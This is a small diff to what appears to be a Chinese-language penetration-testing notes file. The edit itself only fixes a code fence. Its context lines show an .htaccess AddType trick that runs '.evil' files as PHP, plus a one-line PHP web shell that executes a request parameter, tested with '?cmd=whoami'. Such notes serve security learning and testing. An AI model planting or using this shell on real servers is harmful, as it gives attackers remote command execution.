@@ -348,7 +348,7 @@ AddType application/x-httpd-php .evil
 vim shell.php.evil
 # <pre><?php echo shell_exec($_REQUEST["cmd"]) ?></pre>
 # 接下来就是访问shell.php.evil?cmd=whoami，如果有反应则反弹成功
-```bash
+```
 
 17. **ILSpy工具**
 ```bash
